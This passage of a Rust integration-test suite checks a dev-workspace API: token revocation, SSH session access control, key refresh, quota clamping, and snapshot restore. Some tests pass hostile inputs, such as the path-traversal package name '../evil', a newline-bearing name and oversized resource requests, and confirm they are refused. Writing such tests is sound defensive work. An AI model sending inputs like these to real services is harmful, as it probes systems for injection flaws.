    assert_eq!(p, json!({"spec": {"packages": ["hello", "jq"]}}));
}

/// A CLI login authenticates the workspace routes exactly like a browser session — and stops
/// doing so the moment its row is gone, which is the only thing that makes `kl logout` real.
struct StubCliTokens(bool);

#[async_trait::async_trait]
impl Directory for StubCliTokens {
    async fn is_live(&self, _jti: &str) -> bool {
        self.0
    }
}

async fn server_with_cli(routes: Vec<Route>, live: bool) -> Server {
    let store = Arc::new(MemStore::new());
    region(&store, "centralindia").await;
    let jwt = Arc::new(Jwt::new("test-secret-at-least-32-bytes-long!!").unwrap());
    let (client, rec) = mock_client(routes);
    let state = ApiState::new(store.clone() as Arc<dyn MetaStore>, jwt.clone(), HashSet::new())
        .with_kube(client)
        .with_directory(Arc::new(StubCliTokens(live)));
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    let app = router(Arc::new(state));
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    Server { base: format!("http://{addr}"), store, jwt, rec }
}

#[tokio::test]
async fn a_cli_token_is_a_caller_until_it_is_revoked() {
    let ws = json!({"apiVersion": "rustic-git.io/v1alpha1", "kind": "WorkspaceList", "items": []});
    let routes = || {
        vec![
            get(format!("{API}/workspaces"), ws.clone()),
            get(format!("{API}/snapshots"), json!({"apiVersion": "rustic-git.io/v1alpha1", "kind": "SnapshotList", "items": []})),
        ]
    };
    let live = server_with_cli(routes(), true).await;
    let tok = live.jwt.mint_cli("karthik@example.com", "Test User", Some("karthik")).unwrap().0;
    let resp = reqwest::Client::new()
        .get(format!("{}/v1/workspaces", live.base))
        .bearer_auth(&tok)
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 200, "{}", resp.text().await.unwrap());

    let revoked = server_with_cli(routes(), false).await;
    let tok = revoked.jwt.mint_cli("karthik@example.com", "Test User", Some("karthik")).unwrap().0;
    let resp = reqwest::Client::new()
        .get(format!("{}/v1/workspaces", revoked.base))
        .bearer_auth(&tok)
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 401, "a revoked CLI login authenticates nothing");
}

fn ws_with_host_key(name: &str, owner: &str, phase: &str, host_key: Option<&str>) -> Value {
    let mut w = placed_ws(name, owner);
    w["status"]["phase"] = json!(phase);
    match host_key {
        Some(k) => w["status"]["sshHostKey"] = json!(k),
        None => {
            w["status"].as_object_mut().unwrap().remove("sshHostKey");
        }
    }
    w
}

#[tokio::test]
async fn an_ssh_session_is_minted_only_for_a_ready_workspace_the_caller_may_act_on() {
    const HOST_KEY: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIhostkey ws-1";
    let s = server(vec![get(
        format!("{API}/workspaces/ws-1"),
        ws_with_host_key("ws-1", "karthik", "ready", Some(HOST_KEY)),
    )])
    .await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/ssh-session", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 201, "{}", resp.text().await.unwrap());
    let body: Value = resp.json().await.unwrap();
    assert_eq!(body["gateway"], "wss://ws-centralindia.khost.dev/tunnel/ws-1");
    assert_eq!(body["host_key"], HOST_KEY);
    let claims = s.jwt.verify_ssh_session(body["token"].as_str().unwrap()).unwrap();
    assert_eq!(claims.ws, "ws-1");
    assert_eq!(claims.sub, "karthik");
    assert_eq!(claims.region, "centralindia");
    assert!(body["expires_at"].as_str().unwrap().contains('T'), "RFC3339: {body}");

    // Someone else's workspace is a 404, the same as every other workspace route.
    let s = server(vec![get(
        format!("{API}/workspaces/ws-1"),
        ws_with_host_key("ws-1", "bob", "ready", Some(HOST_KEY)),
    )])
    .await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/ssh-session", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 404);

    // Not running: there is nothing to connect to, and the state is what the CLI reports.
    let s = server(vec![get(
        format!("{API}/workspaces/ws-1"),
        ws_with_host_key("ws-1", "karthik", "stopped", Some(HOST_KEY)),
    )])
    .await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/ssh-session", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 409);
    let body: Value = resp.json().await.unwrap();
    assert_eq!(body["error"], "workspace is stopped");

    // Ready but the pod has not reported its host key yet: a session minted now would give the
    // CLI nothing to pin, so it fails closed rather than inviting a TOFU prompt.
    let s = server(vec![get(
        format!("{API}/workspaces/ws-1"),
        ws_with_host_key("ws-1", "karthik", "ready", None),
    )])
    .await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/ssh-session", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 503);

    // A name resolves through the caller's own list — one call for `kl ws ssh <name>` — and the
    // answer says which id it landed on.
    let mut named = ws_with_host_key("ws-1", "karthik", "ready", Some(HOST_KEY));
    named["spec"]["name"] = json!("gh");
    let s = server(vec![get(
        format!("{API}/workspaces"),
        json!({"apiVersion": "rustic-git.io/v1alpha1", "kind": "WorkspaceList", "metadata": {}, "items": [named]}),
    )])
    .await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/gh/ssh-session", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 201, "{}", resp.text().await.unwrap());
    let body: Value = resp.json().await.unwrap();
    assert_eq!(body["id"], "ws-1");
    assert_eq!(body["gateway"], "wss://ws-centralindia.khost.dev/tunnel/ws-1");
}


struct StubKeys;

#[async_trait::async_trait]
impl Directory for StubKeys {
    async fn for_owner(&self, _owner: &str) -> Option<rustic_git_workspaces::api::OwnerMaterial> {
        Some(rustic_git_workspaces::api::OwnerMaterial {
            authorized_keys: "ssh-ed25519 AAAA karthik@laptop".into(),
            git_name: "Karthik".into(),
            git_email: "karthik@example.com".into(),
        })
    }
}

fn ns_obj(name: &str, owner: &str) -> Value {
    json!({
        "apiVersion": "v1", "kind": "Namespace",
        "metadata": {"name": name, "labels": {"rustic-git.io/owner": owner, "rustic-git.io/kind": "workspace"}}
    })
}

/// `karthik` is in `team1` and in a team whose name is long enough that the personal form of the
/// name would have to be DNS-hashed. Carries `StubKeys`' material too: one directory, so one stub.
struct KeyTeams(String);

#[async_trait::async_trait]
impl Directory for KeyTeams {
    async fn teams_for(&self, _user: &str) -> Vec<String> {
        vec!["team1".into(), self.0.clone()]
    }

    async fn for_owner(&self, owner: &str) -> Option<rustic_git_workspaces::api::OwnerMaterial> {
        StubKeys.for_owner(owner).await
    }
}

/// The owner LABEL is what the listing selects on, and a label is a view — a namespace wearing
/// someone else's name must not get this owner's keys, whatever its labels say. The owner's own
/// namespaces are RECOMPUTED rather than pattern-matched, so a hashed one is refreshed too.
#[tokio::test]
async fn refreshing_keys_writes_only_namespaces_named_for_the_owner() {
    let tmp = tempfile::tempdir().unwrap();
    let keys = Arc::new(
        rustic_git_storage::store::Store::open(
            Arc::new(object_store::memory::InMemory::new()),
            tmp.path().join("cache"),
            false,
        )
        .await
        .unwrap(),
    );
    keys.rotate_user_key("karthik", "PRIVATE KEY", "SHA256:abc", None).await.unwrap();

    let long_team = "a".repeat(60);
    let long_ns = rustic_git_workspaces::crd::ws_namespace("karthik", &long_team);
    assert!(!long_ns.ends_with("-karthik"), "this team must be DNS-hashed: {long_ns}");

    let ok = |ns: &str| Route {
        method: "PATCH",
        path: format!("/api/v1/namespaces/{ns}/secrets/user-key"),
        status: 200,
        body: json!({"apiVersion": "v1", "kind": "Secret", "metadata": {"name": "user-key"}}),
    };
    let (client, rec) = mock_client(vec![
        get(
            "/api/v1/namespaces",
            json!({"apiVersion": "v1", "kind": "NamespaceList", "metadata": {}, "items": [
                ns_obj(&rustic_git_workspaces::crd::ws_namespace("karthik", "team1"), "karthik"),
                ns_obj(&long_ns, "karthik"),
                ns_obj("ws-someoneelse", "karthik")
            ]}),
        ),
        ok(&rustic_git_workspaces::crd::ws_namespace("karthik", "team1")),
        ok(&long_ns),
    ]);
    let state = ApiState::new(
        Arc::new(MemStore::new()) as Arc<dyn MetaStore>,
        Arc::new(Jwt::new("test-secret-at-least-32-bytes-long!!").unwrap()),
        HashSet::new(),
    )
    .with_kube(client)
    .with_keys(keys)
    .with_directory(Arc::new(KeyTeams(long_team)));

    rustic_git_workspaces::api::refresh_user_keys(&state, "karthik").await;

    let mut patches: Vec<_> = rec.calls().into_iter().filter(|c| c.starts_with("PATCH")).collect();
    patches.sort();
    let mut want = vec![
        format!("PATCH /api/v1/namespaces/{}/secrets/user-key", rustic_git_workspaces::crd::ws_namespace("karthik", "team1")),
        format!("PATCH /api/v1/namespaces/{long_ns}/secrets/user-key"),
    ];
    want.sort();
    assert_eq!(patches, want, "{patches:?}");
    let body = rec.sent("PATCH", &format!("/api/v1/namespaces/{}/secrets/user-key", rustic_git_workspaces::crd::ws_namespace("karthik", "team1"))).pop().unwrap();
    assert_eq!(body["stringData"]["authorized_keys"], "ssh-ed25519 AAAA karthik@laptop");
    assert_eq!(body["stringData"]["gitconfig"], "[user]\n\tname = \"Karthik\"\n\temail = \"karthik@example.com\"\n");
}

// ── admission ─────────────────────────────────────────────────────────────

/// A region the caller typed becomes the OwnerBinding's NAME. Unknown means a workspace no
/// controller ever claims; chosen means a binding squatted in someone else's region. Only what
/// an admin registered and left active gets past the create.
#[tokio::test]
async fn an_unknown_or_inactive_region_is_refused_on_create() {
    let s = server(create_routes()).await;
    let mut inactive = rustic_git_workspaces::model::Region {
        id: "westeurope".into(),
        name: "westeurope".into(),
        storage_account: "acct".into(),
        blob_container: "wslayers".into(),
        status: "inactive".into(),
    };
    s.store.put_region(&inactive).await.unwrap();
    let tok = token(&s.jwt, "karthik");
    let client = reqwest::Client::new();
    for region in ["nosuch", "centralindia-x", "westeurope"] {
        let resp = client
            .post(format!("{}/v1/workspaces", s.base))
            .bearer_auth(&tok)
            .json(&json!({"name": "web", "region": region, "quota_gb": 20}))
            .send()
            .await
            .unwrap();
        assert_eq!(resp.status(), 422, "workspace in {region}: {}", resp.text().await.unwrap());
        let resp = client
            .post(format!("{}/v1/environments", s.base))
            .bearer_auth(&tok)
            .json(&json!({"name": "app", "region": region, "services": []}))
            .send()
            .await
            .unwrap();
        assert_eq!(resp.status(), 422, "environment in {region}: {}", resp.text().await.unwrap());
    }
    assert!(s.rec.sent("POST", &format!("{API}/workspaces")).is_empty(), "nothing written");
    assert!(s.rec.sent("POST", &format!("{API}/environments")).is_empty(), "nothing written");
    // Activated, the same id is accepted.
    inactive.status = "active".into();
    s.store.put_region(&inactive).await.unwrap();
    let resp = client
        .post(format!("{}/v1/workspaces", s.base))
        .bearer_auth(&tok)
        .json(&json!({"name": "web", "region": "westeurope", "quota_gb": 20}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
}

/// `0` was a `0Gi` claim nothing could start on, and there was no ceiling at all.
#[tokio::test]
async fn a_quota_is_clamped_to_the_range_a_node_can_back() {
    let s = server(create_routes()).await;
    let tok = token(&s.jwt, "karthik");
    let client = reqwest::Client::new();
    for (asked, want) in [(0u64, 1u64), (1_000_000_000_000, 500), (20, 20)] {
        let resp = client
            .post(format!("{}/v1/workspaces", s.base))
            .bearer_auth(&tok)
            .json(&json!({"name": "web", "region": "centralindia", "quota_gb": asked}))
            .send()
            .await
            .unwrap();
        assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
        let resp = client
            .post(format!("{}/v1/environments", s.base))
            .bearer_auth(&tok)
            .json(&json!({"name": "app", "region": "centralindia", "services": [], "quota_gb": asked}))
            .send()
            .await
            .unwrap();
        assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
        let w = s.rec.sent("POST", &format!("{API}/workspaces")).pop().unwrap();
        assert_eq!(w["spec"]["storage"]["quotaGb"], want, "asked {asked}");
        let e = s.rec.sent("POST", &format!("{API}/environments")).pop().unwrap();
        assert_eq!(e["spec"]["storage"]["quotaGb"], want, "asked {asked}");
    }
}

/// A service name becomes a StatefulSet name; a bad one is a 422 from the API server on every
/// reconcile, forever. Refused at the door instead, along with the environment's own name.
#[tokio::test]
async fn an_environment_with_an_unusable_name_or_service_is_refused() {
    let s = server(create_routes()).await;
    let tok = token(&s.jwt, "karthik");
    let client = reqwest::Client::new();
    let svc = |name: &str, ports: Vec<u16>, env: serde_json::Value| {
        json!({"name": name, "image": "alpine", "command": [], "env": env, "mounts": [], "ports": ports})
    };
    let bad_services = [
        vec![svc("Foo_bar", vec![80], json!({}))],
        vec![svc("db", vec![0], json!({}))],
        vec![svc("db", vec![80], json!({"FOO-BAR": "x"}))],
        vec![svc("db", vec![80], json!({})), svc("db", vec![81], json!({}))],
    ];
    for services in bad_services {
        let resp = client
            .post(format!("{}/v1/environments", s.base))
            .bearer_auth(&tok)
            .json(&json!({"name": "app", "region": "centralindia", "services": services}))
            .send()
            .await
            .unwrap();
        assert_eq!(resp.status(), 400, "{services:?}: {}", resp.text().await.unwrap());
    }
    let resp = client
        .post(format!("{}/v1/environments", s.base))
        .bearer_auth(&tok)
        .json(&json!({"name": "bad\nname", "region": "centralindia", "services": []}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 422, "{}", resp.text().await.unwrap());
    assert!(s.rec.sent("POST", &format!("{API}/environments")).is_empty(), "nothing written");
}

/// A name is a directory in the person's shared home, so it is unique per (owner, team): the
/// second `web` is refused, and refused from `spec`, not from the object's name.
#[tokio::test]
async fn a_second_workspace_with_the_same_name_in_the_same_team_is_refused() {
    let taken = json!({
        "apiVersion": "rustic-git.io/v1alpha1", "kind": "WorkspaceList", "metadata": {},
        "items": [placed_ws("ws-old", "karthik")]
    });
    let s = server(vec![get(format!("{API}/workspaces"), taken), post(format!("{API}/workspaces"), ws_obj("ws-new", "karthik"))]).await;
    let tok = token(&s.jwt, "karthik");
    let name = placed_ws("ws-old", "karthik")["spec"]["name"].as_str().unwrap().to_string();
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces", s.base))
        .bearer_auth(&tok)
        .json(&json!({"name": name, "region": "centralindia", "quota_gb": 20}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 409, "{}", resp.text().await.unwrap());
    assert!(s.rec.sent("POST", &format!("{API}/workspaces")).is_empty(), "nothing was written");
    // A different name in the same team is fine.
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces", s.base))
        .bearer_auth(&tok)
        .json(&json!({"name": "web-2", "region": "centralindia", "quota_gb": 20}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
}

/// Attaching writes SPEC and nothing else — the agent owns status, and the whole grant (resolv.conf,
/// both NetworkPolicies) is its reconcile, not this handler's.
#[tokio::test]
async fn attaching_sets_the_spec_field_and_its_listing_label() {
    let s = server(vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        get(format!("{API}/environments/env-1"), env_obj("env-1", "karthik")),
        Route { method: "PATCH", path: format!("{API}/workspaces/ws-1"), status: 200, body: placed_ws("ws-1", "karthik") },
    ])
    .await;

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/attach", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({"environment": "env-1"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    let patch = s.rec.sent("PATCH", &format!("{API}/workspaces/ws-1")).pop().unwrap();
    assert_eq!(patch["spec"]["attachedEnvironment"], "env-1");
    // `delete_env`'s sweep selects on this label, since a teammate's workspace can be attached to
    // an environment it does not own — stamped in the same patch as spec so the two never drift.
    assert_eq!(patch["metadata"]["labels"]["rustic-git.io/attached-environment"], "env-1");
    assert!(patch["status"].is_null(), "the API writes spec/labels only");
}

/// A different region is a different cluster: there is no route and no DNS between them, so this is
/// refused before anything is written rather than failing later in a reconcile.
#[tokio::test]
async fn attaching_across_regions_is_refused() {
    let mut env = env_obj("env-1", "karthik");
    env["spec"]["region"] = json!("westeurope");
    let s = server(vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        get(format!("{API}/environments/env-1"), env),
    ])
    .await;

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/attach", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({"environment": "env-1"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 409);
    assert!(s.rec.sent("PATCH", &format!("{API}/workspaces/ws-1")).is_empty(), "nothing is written on a refusal");
}

/// An environment the caller has no part in is a 404, not a 403: the same answer as one that does
/// not exist, so the route cannot be used to discover other people's environments.
#[tokio::test]
async fn attaching_someone_elses_environment_is_not_found() {
    let s = server(vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        get(format!("{API}/environments/env-1"), env_obj("env-1", "bob")),
    ])
    .await;

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/attach", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({"environment": "env-1"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 404);
    assert!(s.rec.sent("PATCH", &format!("{API}/workspaces/ws-1")).is_empty());
}

/// Detach is idempotent — it is the state the caller wants, not an event — and clears the field
/// with `null`, which is how a merge patch REMOVES a key: `""` would leave the reconciler resolving
/// an environment named empty-string.
#[tokio::test]
async fn detaching_is_a_null_merge_patch_and_repeats() {
    let s = server(vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        Route { method: "PATCH", path: format!("{API}/workspaces/ws-1"), status: 200, body: placed_ws("ws-1", "karthik") },
    ])
    .await;
    let tok = token(&s.jwt, "karthik");

    for _ in 0..2 {
        let resp = reqwest::Client::new()
            .post(format!("{}/v1/workspaces/ws-1/detach", s.base))
            .bearer_auth(&tok)
            .send()
            .await
            .unwrap();
        assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    }
    let patches = s.rec.sent("PATCH", &format!("{API}/workspaces/ws-1"));
    assert_eq!(patches.len(), 2);
    assert!(patches[0]["spec"]["attachedEnvironment"].is_null());
    // Cleared in the same patch as the spec field, so the listing label never outlives the
    // attachment it is a view of.
    assert!(patches[0]["metadata"]["labels"]["rustic-git.io/attached-environment"].is_null());
}

/// Deleting an environment clears the attachment on every workspace pointing at it: only `/v1` may
/// write spec, so this cannot be the agent's job.
#[tokio::test]
async fn deleting_an_environment_clears_the_attachments_to_it() {
    let mut attached = placed_ws("ws-1", "karthik");
    attached["spec"]["attachedEnvironment"] = json!("env-1");
    let list = json!({
        "apiVersion": "rustic-git.io/v1alpha1", "kind": "WorkspaceList", "metadata": {},
        "items": [attached, placed_ws("ws-2", "karthik")]
    });
    let s = server(vec![
        get(format!("{API}/environments/env-1"), env_obj("env-1", "karthik")),
        Route { method: "DELETE", path: format!("{API}/environments/env-1"), status: 200, body: env_obj("env-1", "karthik") },
        get(format!("{API}/workspaces"), list),
        Route { method: "PATCH", path: format!("{API}/workspaces/ws-1"), status: 200, body: placed_ws("ws-1", "karthik") },
    ])
    .await;

    let resp = reqwest::Client::new()
        .delete(format!("{}/v1/environments/env-1", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    let patch = s.rec.sent("PATCH", &format!("{API}/workspaces/ws-1")).pop().unwrap();
    assert!(patch["spec"]["attachedEnvironment"].is_null());
    // The unattached one is left alone.
    assert!(s.rec.sent("PATCH", &format!("{API}/workspaces/ws-2")).is_empty());
}

/// The attachment sweep selects on `ATTACHED_ENV_LABEL`, not on the caller's owner label: `attach_ws`
/// authorizes through `may_act_on`, which admits team members, so a workspace attached to this
/// environment may be owned by someone else on the team entirely. An owner-scoped selector would
/// silently miss it and leave it pointing at a deleted environment forever.
#[tokio::test]
async fn delete_env_lists_only_workspaces_attached_to_it() {
    let s = server(vec![
        get(format!("{API}/environments/env-1"), env_obj("env-1", "karthik")),
        Route { method: "DELETE", path: format!("{API}/environments/env-1"), status: 200, body: env_obj("env-1", "karthik") },
        get(format!("{API}/workspaces"), json!({"apiVersion": "v1", "kind": "WorkspaceList", "items": []})),
    ])
    .await;

    let resp = reqwest::Client::new()
        .delete(format!("{}/v1/environments/env-1", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    let listed = s
        .rec
        .requests()
        .into_iter()
        .find(|r| r.starts_with(&format!("GET {API}/workspaces?")))
        .expect("the attachment sweep listed workspaces");
    assert!(
        listed.contains("rustic-git.io%2Fattached-environment%3Denv-1")
            || listed.contains("rustic-git.io/attached-environment=env-1"),
        "{listed}"
    );
}

/// Nothing stamps a finalizer on a `Workspace`, so its deletion is pure garbage collection and the
/// agent never observes it. The workspace-side policy goes with the namespace's ownerReference and
/// the attach directory is swept by the janitor, but the ENVIRONMENT-side policy lives in another
/// namespace owned by the Environment — so this handler, which can still read the spec, removes it.
#[tokio::test]
async fn deleting_an_attached_workspace_removes_the_environment_side_policy() {
    let mut attached = placed_ws("ws-1", "karthik");
    attached["spec"]["attachedEnvironment"] = json!("env-1");
    let policy = format!(
        "/apis/networking.k8s.io/v1/namespaces/{}/networkpolicies/{}",
        rustic_git_workspaces::crd::env_namespace("env-1"),
        rustic_git_workspaces::k8s::attach_policy_name("ws-1")
    );
    let s = server(vec![
        get(format!("{API}/workspaces/ws-1"), attached),
        Route { method: "DELETE", path: format!("{API}/workspaces/ws-1"), status: 200, body: placed_ws("ws-1", "karthik") },
        Route { method: "DELETE", path: policy.clone(), status: 200, body: json!({"kind": "Status", "apiVersion": "v1", "status": "Success"}) },
    ])
    .await;

    let resp = reqwest::Client::new()
        .delete(format!("{}/v1/workspaces/ws-1", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    let calls = s.rec.calls();
    let ws = calls.iter().position(|c| c == &format!("DELETE {API}/workspaces/ws-1")).expect("{calls:?}");
    let np = calls.iter().position(|c| c == &format!("DELETE {policy}")).expect("{calls:?}");
    // The Workspace goes FIRST: an agent pass landing between the two would re-`ensure` the grant
    // and then find no object left to ever remove it again.
    assert!(ws < np, "the workspace must be gone before its grant is: {calls:?}");
}

/// Detach on a STOPPED workspace. `apply_workspace` returns at the stop gate, so no reconcile ever
/// sees the cleared spec — and clearing it destroys the `Attached` condition that addresses the
/// grant. The handler reads that condition BEFORE the patch and collects the environment-side half
/// itself, or the ingress lives on in `env-1` until the environment is deleted.
#[tokio::test]
async fn detaching_a_stopped_workspace_still_collects_the_environment_side_policy() {
    let mut w = placed_ws("ws-1", "karthik");
    w["spec"]["desiredState"] = json!("stopped");
    w["spec"]["attachedEnvironment"] = json!("env-1");
    w["status"]["conditions"] = json!([{"type": "Attached", "status": "True", "reason": "Converged",
                                        "message": "env-1", "lastTransitionTime": "2026-08-30T00:00:00Z"}]);
    // The spec field is ALREADY gone: this is the second detach, or the first one's patch as the
    // handler re-reads it. Only the condition is left to say where the grant is.
    let mut cleared = w.clone();
    cleared["spec"]["attachedEnvironment"] = json!(null);
    let policy = format!(
        "/apis/networking.k8s.io/v1/namespaces/{}/networkpolicies/{}",
        rustic_git_workspaces::crd::env_namespace("env-1"),
        rustic_git_workspaces::k8s::attach_policy_name("ws-1")
    );
    let s = server(vec![
        get(format!("{API}/workspaces/ws-1"), cleared.clone()),
        Route { method: "PATCH", path: format!("{API}/workspaces/ws-1"), status: 200, body: cleared },
        Route { method: "DELETE", path: policy.clone(), status: 200, body: json!({"kind": "Status", "apiVersion": "v1", "status": "Success"}) },
    ])
    .await;

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/detach", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    assert!(s.rec.calls().contains(&format!("DELETE {policy}")), "{:?}", s.rec.calls());
}

// ── restoring takes the snapshot's frozen definition ──────────────────────

/// A `Ready` `Snapshot` CR carrying an optional `spec.state` — what `find_commit_model_snapshot_for_restore`
/// reads, and the only source of the restored spec once the source workspace is gone.
fn ready_snap(name: &str, volume: &str, owner: &str, state: Option<Value>) -> Value {
    let mut spec = json!({"volume": volume, "owner": owner, "worktree": volume, "parent": "", "pinned": false});
    if let Some(st) = state {
        spec["state"] = st;
    }
    json!({
        "apiVersion": "rustic-git.io/v1alpha1", "kind": "Snapshot",
        "metadata": {"name": name}, "spec": spec, "status": {"phase": "ready"},
    })
}

fn workspace_state(image: &str, packages: &[&str], quota_gb: u64) -> Value {
    json!({"kind": "workspace", "image": image, "packages": packages, "quotaGb": quota_gb,
           "resources": {"cpuRequest": "2", "cpuLimit": "4", "memoryRequest": "4Gi", "memoryLimit": "8Gi"}})
}

fn environment_state(services: usize, quota_gb: u64) -> Value {
    let svcs: Vec<Value> = (0..services)
        .map(|i| json!({"name": format!("svc{i}"), "image": "alpine", "command": [], "env": {}, "mounts": []}))
        .collect();
    json!({"kind": "environment", "services": svcs, "quotaGb": quota_gb})
}

/// The source workspace is gone (no route for it ⇒ 404), which is exactly when restoring matters.
async fn server_with_snapshot_only(id: &str, state: Option<Value>) -> Server {
    server(vec![
        get(format!("{API}/snapshots/{id}"), ready_snap(id, "ws-src", "karthik", state)),
        no_workspaces(),
        post(format!("{API}/workspaces"), ws_obj("ws-new", "karthik")),
    ])
    .await
}

async fn server_with_env_snapshot_only(id: &str, state: Option<Value>) -> Server {
    server(vec![
        get(format!("{API}/snapshots/{id}"), ready_snap(id, "env-src", "karthik", state)),
        post(format!("{API}/environments"), new_env("env-new", "karthik")),
    ])
    .await
}

async fn restore(s: &Server, path: &str, body: Value) -> reqwest::Response {
    reqwest::Client::new()
        .post(format!("{}{path}", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&body)
        .send()
        .await
        .unwrap()
}

#[tokio::test]
async fn restoring_a_workspace_whose_source_is_gone_takes_the_snapshot_state() {
    let s = server_with_snapshot_only("snap-ws", Some(workspace_state("alpine:3.19", &["ripgrep"], 7))).await;
    let r = restore(&s, "/v1/workspaces/restore", json!({"name": "back", "snapshot_id": "snap-ws"})).await;
    assert_eq!(r.status(), 202, "{}", r.text().await.unwrap());
    let w = &s.rec.sent("POST", &format!("{API}/workspaces"))[0];
    assert_eq!(w["spec"]["image"], "alpine:3.19");
    assert_eq!(w["spec"]["packages"], json!(["ripgrep"]));
    assert_eq!(w["spec"]["storage"]["quotaGb"], 7);
    assert_eq!(w["spec"]["resources"]["memoryLimit"], "8Gi");
}

#[tokio::test]
async fn a_restore_body_field_overrides_the_snapshot_state() {
    let s = server_with_snapshot_only("snap-ws", Some(workspace_state("alpine:3.19", &["ripgrep"], 7))).await;
    let r = restore(
        &s,
        "/v1/workspaces/restore",
        json!({"name": "back", "snapshot_id": "snap-ws", "image": "alpine:3.20", "quota_gb": 11}),
    )
    .await;
    assert_eq!(r.status(), 202, "{}", r.text().await.unwrap());
    let w = &s.rec.sent("POST", &format!("{API}/workspaces"))[0];
    assert_eq!(w["spec"]["image"], "alpine:3.20");
    assert_eq!(w["spec"]["storage"]["quotaGb"], 11);
    // untouched fields still come from the snapshot
    assert_eq!(w["spec"]["packages"], json!(["ripgrep"]));
}

/// There is no `resources` rung: sizing a restore is not offered anywhere, and an unclamped body
/// field would let a caller reserve a node's whole capacity. Serde drops the unknown field and the
/// created spec keeps the snapshot's frozen resources.
#[tokio::test]
async fn a_restore_body_cannot_override_the_frozen_resources() {
    let s = server_with_snapshot_only("snap-ws", Some(workspace_state("alpine:3.19", &[], 7))).await;
    let r = restore(
        &s,
        "/v1/workspaces/restore",
        json!({"name": "back", "snapshot_id": "snap-ws",
               "resources": {"cpuRequest": "64", "cpuLimit": "64", "memoryRequest": "512Gi", "memoryLimit": "512Gi"}}),
    )
    .await;
    assert_eq!(r.status(), 202, "{}", r.text().await.unwrap());
    let w = &s.rec.sent("POST", &format!("{API}/workspaces"))[0];
    assert_eq!(w["spec"]["resources"], json!({"cpuRequest": "2", "cpuLimit": "4", "memoryRequest": "4Gi", "memoryLimit": "8Gi"}));
}

/// A snapshot cut before this existed carries no `state`, and must restore exactly as it used to.
#[tokio::test]
async fn a_pre_change_snapshot_restores_as_before() {
    let s = server_with_snapshot_only("snap-ws", None).await;
    let r = restore(&s, "/v1/workspaces/restore", json!({"name": "back", "snapshot_id": "snap-ws"})).await;
    assert_eq!(r.status(), 202, "{}", r.text().await.unwrap());
    let w = &s.rec.sent("POST", &format!("{API}/workspaces"))[0];
    assert_eq!(w["spec"]["image"], rustic_git_workspaces::model::default_ws_image());
    assert!(w["spec"]["packages"].as_array().is_none_or(|p| p.is_empty()), "{w}");
    assert_eq!(w["spec"]["storage"]["quotaGb"], 20);
}

/// `spec.state` is data an agent wrote and a cluster admin can edit — it goes through
/// `validate_list` exactly like a request body's package list does.
#[tokio::test]
async fn a_snapshot_with_a_bad_package_name_is_refused_like_a_bad_body() {
    let s = server_with_snapshot_only("snap-ws", Some(workspace_state("alpine:3.19", &["../evil"], 7))).await;
    let r = restore(&s, "/v1/workspaces/restore", json!({"name": "back", "snapshot_id": "snap-ws"})).await;
    assert_eq!(r.status(), 422, "{}", r.text().await.unwrap());
